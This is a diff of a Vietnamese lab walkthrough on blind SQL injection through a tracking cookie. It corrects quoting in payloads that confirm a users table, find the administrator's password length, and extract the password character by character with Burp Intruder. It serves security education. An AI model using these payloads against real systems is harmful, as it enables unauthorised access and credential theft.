@@ -38,7 +38,7 @@ Thì trước khi bắt đầu tìm password ta vẫn cần xác nhận trước
 
 Ta dùng payload sau để xác định là có bảng users hay không:
 
-    [cookie] AND (SELECT 'a' FROM users LIMIT 1)='a
+    [cookie]' AND (SELECT 'a' FROM users LIMIT 1)='a
 
 Ở đây ta dùng kết quả trả về ảo là 'a' để xác định xem có bảng users nào không và đề phòng bảng users có nhiều user thì ta sẽ giới hạn nó trả về là 1 dòng để lúc kết quả so sánh tránh vì nhiều chữ `a`
 quá mà dẫn tới lỗi hệ thống. Và khi mà có thì vế sau `AND` sẽ trả về `true` và message `Welcome Back` sẽ xuất hiện nếu không có thì sẽ không xuất hiện.
@@ -47,13 +47,13 @@ quá mà dẫn tới lỗi hệ thống. Và khi mà có thì vế sau `AND` s�
 
 Thì ở đây là có 1 bảng tên là `users`. Tiếp đến dùng payload như này để xác định có `administrator` user trong bảng `users` hay không:
 
-    [cookie] AND (SELECT 'a' FROM users WHERE username='administrator')='a
+    [cookie]' AND (SELECT 'a' FROM users WHERE username='administrator')='a
 
 <img width="2064" height="1316" alt="image" src="https://github.com/user-attachments/assets/b95c99d5-46b4-4077-8815-4f561c158c00" />
 
 Kết quả là có user như vậy. Tiếp đến là ta phải xác định được độ dài của `password` thì để làm được điều này ta dùng hàm `LENGTH` để lấy độ dài password và payload sẽ như sau:
 
-    [cookie] AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password) > 1)='a
+    [cookie]' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password) > 1)='a
 
 Ta sẽ so sánh cho tới khi respone trả về không còn message `Welcome Back` nữa. Thì lúc này độ dài password sẽ bằng độ dài so sánh
 
@@ -65,7 +65,7 @@ Thì sau khi làm lại vài lần thì ta thấy khi so sánh với 20 thì kh�
 
 Tiếp đến là phần mò pasword thì ta sẽ dùng tab Intruder của Burp Suite làm cái này với payload như sau:
 
-    [cookie] AND (SELECT substring(password,1,1) FROM users WHERE username='administrator')='parameter
+    [cookie]' AND (SELECT substring(password,1,1) FROM users WHERE username='administrator')='parameter
 
 Thì với cách này ta sẽ xác định được từng ký tự trong password. Như payload trên là ký tự thứ nhất của password.
 
@@ -77,7 +77,7 @@ Thì với cách này ta sẽ xác định được từng ký tự trong passwo
 
 Tiếp với ký tự 2:
 
-    [cookie] AND (SELECT substring(password,2,1) FROM users WHERE username='administrator')='parameter
+    [cookie]' AND (SELECT substring(password,2,1) FROM users WHERE username='administrator')='parameter
 
 <img width="2563" height="1443" alt="image" src="https://github.com/user-attachments/assets/3516f287-611e-4392-be38-823caa9bfe76" />
 
